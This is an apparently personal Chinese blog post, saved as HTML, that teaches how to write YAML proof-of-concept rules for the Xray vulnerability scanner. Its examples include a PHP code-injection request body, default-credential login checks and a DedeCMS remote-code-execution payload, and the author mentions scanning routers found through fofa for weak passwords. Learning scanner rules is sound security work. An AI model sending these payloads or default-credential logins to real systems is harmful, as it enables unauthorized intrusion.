@@ -1,0 +1,608 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Mr.BelieVe">
+  <meta name="keywords" content="">
+  
+  <title>Xray poc 编写学习 - Mr.BelieVe&#39;s Treasure</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.8.9-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Mr.BelieVe's Treasure" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Mr.BelieVe's Treasure</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Xray poc 编写学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-27 01:15" pubdate>
+        2021年4月27日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Xray poc 编写学习</h1>
+            
+            <div class="markdown-body">
+              <h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><h3 id="在线自动生成"><a href="#在线自动生成" class="headerlink" title="在线自动生成"></a>在线自动生成</h3><p>直接访问 <a target="_blank" rel="noopener" href="https://phith0n.github.io/xray-poc-generation/">https://phith0n.github.io/xray-poc-generation/</a><br>源仓库<a target="_blank" rel="noopener" href="https://github.com/phith0n/xray-poc-generation">phith0n/xray-poc-generation: 🧬 辅助生成 XRay YAML POC</a></p>
+<h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><p>我使用vscode多，所以选择vsc的。<br>![](Xray poc 编写学习/Snipaste_2021-04-28_23-43-47.png)</p>
+<p>安装后在这里点击<br>![](Xray poc 编写学习/Snipaste_2021-04-28_23-45-07.png)</p>
+<p>然后改yaml.schemas为</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;yaml.schemas&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;https://docs.xray.cool/assets/poc/yaml-poc-schema.json&quot;</span>: <span class="hljs-string">&quot;poc-yaml-*.yml&quot;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这样在写<code>poc-yaml-&#123;Your_file_name&#125;.yml</code>时就会根据官方schema来提示了</p>
+<h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">name: poc-yaml-learning<br>rules:<br>  - method: GET<br>    path: <span class="hljs-string">&quot;/&quot;</span><br>    expression: |<br>      response.<span class="hljs-attribute">status</span>==200 &amp;&amp; body.bcontains(b<span class="hljs-string">&#x27;learning Domain&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>整个 POC 是一个键值对，包含3个键：</p>
+<ul>
+<li><code>name: string</code>  名字</li>
+<li><code>set: []string</code> 定义变量，如随机数和反连平台等 </li>
+<li><code>rules: []Rule</code> 规则列表</li>
+<li><code>detail: map[string]string</code> 内部存储需要返回给 xray 引擎的内容，如果无可忽略。</li>
+</ul>
+<p>Rule是poc的灵魂，yaml里一个rule是一个键值对，包含：</p>
+<ul>
+<li><code>method: string</code> 请求方法</li>
+<li><code>path: string</code> 请求的完整 Path，包括 querystring 等</li>
+<li><code>headers: map[string]string</code> 请求 HTTP 头，Rule 中指定的值会被覆盖到原始数据包的 HTTP 头中</li>
+<li><code>body: string</code> 请求的Body</li>
+<li><code>follow_redirects: bool</code> 是否允许跟随300跳转</li>
+<li><code>expression: string</code></li>
+<li><code>search: string</code></li>
+</ul>
+<h3 id="Rule"><a href="#Rule" class="headerlink" title="Rule"></a>Rule</h3><p>根据这些键的作用，分为三类：</p>
+<ol>
+<li><code>method</code>、<code>path</code>、<code>headers</code>、<code>body</code>、<code>follow_redirects</code>的作用是生成检测数据包</li>
+<li><code>expression</code> 的作用是判断该条 Rule 的结果</li>
+<li><code>search</code> 的作用是从返回包中提取信息</li>
+</ol>
+<h3 id="怎么写expression"><a href="#怎么写expression" class="headerlink" title="怎么写expression"></a>怎么写expression</h3><p>部分函数方法</p>
+<ul>
+<li><code>response.content_type.contains(&#39;application/octet-stream&#39;) &amp;&amp; response.body.bcontains(b&#39;\x00\x01\x02&#39;)</code><ul>
+<li>返回包的 content-type 包含 application/octet-stream，且 body 中包含 0x000102 这段二进制串</li>
+</ul>
+</li>
+<li><code>response.body.bcontains(b&#39;test&#39;)</code><ul>
+<li>返回包 body 包含 bytes 类型的 test，用bcontains方法</li>
+</ul>
+</li>
+<li><code>r&#39;^PK\x03\x04&#39;.bmatches(response.body)</code><ul>
+<li>body 匹配上正则<code>r&#39;^PK\\x03\\x04</code>（文件头判断）</li>
+</ul>
+</li>
+<li><code>response.status &gt;= 300 &amp;&amp; response.status &lt; 400</code><ul>
+<li>返回包的 status code 在 300~400 之间</li>
+</ul>
+</li>
+<li><code>r&#39;&lt;input value=&quot;(.+?)&quot;&#39;.bmatches(response.body)</code><ul>
+<li>Body包含表单</li>
+</ul>
+</li>
+<li><code>response.headers[&#39;location&#39;]==&quot;https://www.example.com&quot;</code><ul>
+<li>headers 中 <code>Location</code> 等于指定值，如果 <code>Location</code> 不存在，该表达式返回 false</li>
+</ul>
+</li>
+<li><code>&#39;docker-distribution-api-version&#39; in response.headers &amp;&amp; response.headers[&#39;docker-distribution-api-version&#39;].contains(&#39;registry/2.0&#39;)</code><ul>
+<li>headers 中包含 <code>docker-distribution-api-version</code> 并且 value 包含指定字符串，如果不判断 <code>in</code>，后续的 contains 会出错。</li>
+<li><code>response.body.bcontains(bytes(response.url.path))</code><ul>
+<li>body 中包含 url 的 path</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>expression表达式返回的必须是一个bool类型的</p>
+<p>完整参考 <a target="_blank" rel="noopener" href="https://docs.xray.cool/#/guide/poc?id=%e5%a6%82%e4%bd%95%e7%bc%96%e5%86%99expression%e8%a1%a8%e8%be%be%e5%bc%8f">官方简短说明</a> 或 <a href="[https://github.com/google/cel-spec](https://github.com/google/cel-spec">CEL表达式详细信息</a></p>
+<h3 id="怎么用search"><a href="#怎么用search" class="headerlink" title="怎么用search"></a>怎么用search</h3><p><strong>从返回包中提取信息</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">name: poc-yaml-example-com<br>rules:<br>  - method: GET<br>    path: <span class="hljs-string">&quot;/update&quot;</span><br>    expression: <span class="hljs-string">&quot;true&quot;</span><br>    search: |<br>      &lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;csrftoken&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;(?P&lt;token&gt;.+?)&quot;</span><br>  - method: POST<br>    path: <span class="hljs-string">&quot;/update&quot;</span><br>    body: |<br>      <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;;echo(md5(123));//&amp;csrftoken=&#123;&#123;token&#125;&#125;</span><br><span class="hljs-string">    expression: |</span><br><span class="hljs-string">      status == 200 &amp;&amp; body.bcontains(b&#x27;</span>202cb962ac59075b964b07152d234b70&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p><code>?P&lt;var&gt;</code> 是正则表达式命名组的语法，可在 <a target="_blank" rel="noopener" href="https://regex101.com/r/VQndKy/1/">https://regex101.com/r/VQndKy/1/</a> 调试。<code>&#123;&#123;`、`&#125;&#125;</code>中包含的名字是正则的提取的数据，没提取成功就不会进行替换。</p>
+<h2 id="poc的执行过程"><a href="#poc的执行过程" class="headerlink" title="poc的执行过程"></a>poc的执行过程</h2><p>先对poc的关键，set和expression部分进行预编译和静态类型检查，然后有新的请求/链接时，根据rule对请求进行修改，替换掉原始数据包的数据，再获取对应请求的响应，匹配<code>expression</code>就进行下一个rule，全部rule执行完成后，表示有漏洞，并将detail的信息进行漏洞输出</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>官方仓库里经过漏洞镜像审核的poc <a target="_blank" rel="noopener" href="https://github.com/chaitin/xray/tree/master/pocs">https://github.com/chaitin/xray/tree/master/pocs</a></p>
+<h3 id="自己小例子"><a href="#自己小例子" class="headerlink" title="自己小例子"></a>自己小例子</h3><p>之前整过python代码自动跑fofa搜出来的防火墙/路由器的弱口令，当时也基本是针对性的写的脚本，大概有50行，而现在粘贴路径，User-Agent，还要body，以及响应的判断即可</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">poc-yaml-weekpasswd</span><br><span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">method:</span> <span class="hljs-string">POST</span><br>    <span class="hljs-attr">path:</span> <span class="hljs-string">/userLogin.asp</span><br>    <span class="hljs-attr">headers:</span><br>      <span class="hljs-attr">User-Agent:</span> <span class="hljs-string">&gt;-</span><br>        <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64)</span> <span class="hljs-string">AppleWebKit/537.36</span> <span class="hljs-string">(KHTML,</span><br>        <span class="hljs-string">like</span> <span class="hljs-string">Gecko)</span> <span class="hljs-string">Chrome/90.0.4430.85</span> <span class="hljs-string">Safari/537.36</span> <span class="hljs-string">Edg/90.0.818.49</span><br>    <span class="hljs-attr">body:</span> <span class="hljs-string">&gt;-</span><br>      <span class="hljs-string">save2Cookie=&amp;vldcode=&amp;account=admin&amp;password=admin&amp;btnSubmit=+%B5%C7%C2%BC+</span><br>    <span class="hljs-attr">follow_redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">expression:</span> <span class="hljs-string">|</span><br>      <span class="hljs-string">response.status==200</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">body.contains(&quot;xx管理&quot;)</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p>随后在config里的plugin下，<code>local_poc: []</code> 加上自己poc的路径即可</p>
+<h3 id="社区poc"><a href="#社区poc" class="headerlink" title="社区poc"></a>社区poc</h3><p><a target="_blank" rel="noopener" href="https://github.com/chaitin/xray/blob/master/pocs/kingsoft-v8-default-password.yml">源地址</a></p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs swift">name: poc<span class="hljs-operator">-</span>yaml<span class="hljs-operator">-</span>kingsoft<span class="hljs-operator">-</span>v8<span class="hljs-operator">-</span><span class="hljs-keyword">default</span><span class="hljs-operator">-</span>password<br>rules:<br>  <span class="hljs-operator">-</span> method: <span class="hljs-type">POST</span><br>    path: <span class="hljs-operator">/</span>inter<span class="hljs-operator">/</span>ajax.php<span class="hljs-operator">?</span>cmd<span class="hljs-operator">=</span>get_user_login_cmd<br>    body: <span class="hljs-string">&quot;&#123;<span class="hljs-subst">\&quot;</span>get_user_login_cmd<span class="hljs-subst">\&quot;</span>:&#123;<span class="hljs-subst">\&quot;</span>name<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>admin<span class="hljs-subst">\&quot;</span>,<span class="hljs-subst">\&quot;</span>password<span class="hljs-subst">\&quot;</span>:<span class="hljs-subst">\&quot;</span>21232f297a57a5a743894a0e4a801fc3<span class="hljs-subst">\&quot;</span>&#125;&#125;&quot;</span><br>    follow_redirects: <span class="hljs-literal">true</span><br>    expression: <span class="hljs-operator">|</span><br>      response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;ADMIN&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;userSession&quot;</span>)<br>detail:<br>  author: <span class="hljs-type">B1anda0</span>(https:<span class="hljs-comment">//github.com/B1anda0)</span><br>  links:<br>    <span class="hljs-operator">-</span> https:<span class="hljs-comment">//idc.wanyunshuju.com/aqld/2123.html</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/chaitin/xray/blob/master/pocs/vmware-vcenter-unauthorized-rce-cve-2021-21972.yml">xray/vmware-vcenter-unauthorized-rce-cve-2021-21972.yml at master · chaitin/xray</a></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">name:</span> poc-yaml-vmware-vcenter-unauthorized-rce-cve<span class="hljs-number">-2021</span><span class="hljs-number">-21972</span><br><span class="hljs-symbol">rules:</span><br>  - method: GET<br><span class="hljs-symbol">    path:</span> <span class="hljs-meta-keyword">/ui/</span>vropspluginui<span class="hljs-meta-keyword">/rest/</span>services/uploadova<br><span class="hljs-symbol">    follow_redirects:</span> false<br><span class="hljs-symbol">    expression:</span> |<br>      response.status == <span class="hljs-number">405</span> &amp;&amp; response.body.bcontains(b<span class="hljs-string">&quot;Method Not Allowed&quot;</span>)<br>  - method: GET<br><span class="hljs-symbol">    path:</span> <span class="hljs-meta-keyword">/ui/</span>vropspluginui<span class="hljs-meta-keyword">/rest/</span>services/getstatus<br><span class="hljs-symbol">    follow_redirects:</span> false<br><span class="hljs-symbol">    expression:</span> |<br>      response.status == <span class="hljs-number">200</span> &amp;&amp; response.body.bcontains(b<span class="hljs-string">&quot;States&quot;</span>) &amp;&amp; response.body.bcontains(b<span class="hljs-string">&quot;Install Progress&quot;</span>)<br><span class="hljs-symbol">detail:</span><br><span class="hljs-symbol">  author:</span> B1anda0(https:<span class="hljs-comment">//github.com/B1anda0)</span><br><span class="hljs-symbol">  links:</span><br>    - https:<span class="hljs-comment">//swarm.ptsecurity.com/unauth-rce-vmware/</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/chaitin/xray/blob/master/pocs/dedecms-cve-2018-7700-rce.yml">dedecms-cve-2018-7700-rce </a></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dts">  <br><span class="hljs-symbol">name:</span> poc-yaml-dedecms-cve<span class="hljs-number">-2018</span><span class="hljs-number">-7700</span>-rce<br><span class="hljs-symbol">set:</span><br><span class="hljs-symbol">  r:</span> randomInt(<span class="hljs-number">2000000000</span>, <span class="hljs-number">2100000000</span>)<br><span class="hljs-symbol">rules:</span><br>  - method: GET<br><span class="hljs-symbol">    path:</span> &gt;-<br>      /tag_test_action.php?url=a<span class="hljs-variable">&amp;token</span>=<span class="hljs-variable">&amp;partcode</span>=&#123;dede:field%<span class="hljs-number">20</span>name=%<span class="hljs-number">27</span>source%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>runphp=%<span class="hljs-number">27</span>yes%<span class="hljs-number">27</span>&#125;echo%<span class="hljs-number">20</span>md5&#123;&#123;r&#125;&#125;;&#123;/dede:field&#125;<br><span class="hljs-symbol">    follow_redirects:</span> true<br><span class="hljs-symbol">    expression:</span> |<br>      response.status == <span class="hljs-number">200</span> &amp;&amp; response.body.bcontains(bytes(md5(string(r))))<br><span class="hljs-symbol">detail:</span><br><span class="hljs-symbol">  author:</span> harris2015(https:<span class="hljs-comment">//github.com/harris2015)</span><br>  Affected Version: <span class="hljs-string">&quot;V5.7SP2正式版(2018-01-09)&quot;</span><br><span class="hljs-symbol">  links:</span><br>    - https:<span class="hljs-comment">//xz.aliyun.com/t/2224</span><br></code></pre></td></tr></table></figure>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><a target="_blank" rel="noopener" href="https://docs.xray.cool/#/guide/high_quality_poc">编写高质量poc - xray 安全评估工具文档</a> 可以反复观看学习比照</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2099/12/31/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">个人原则宪法</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/04/22/OpenCanary%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%90%86%E8%A7%A3/">
+                        <span class="hidden-mobile">OpenCanary使用及理解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.lazyComments('comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'mrbelieve128/mrbelieve128.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        浙ICP备19033044号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
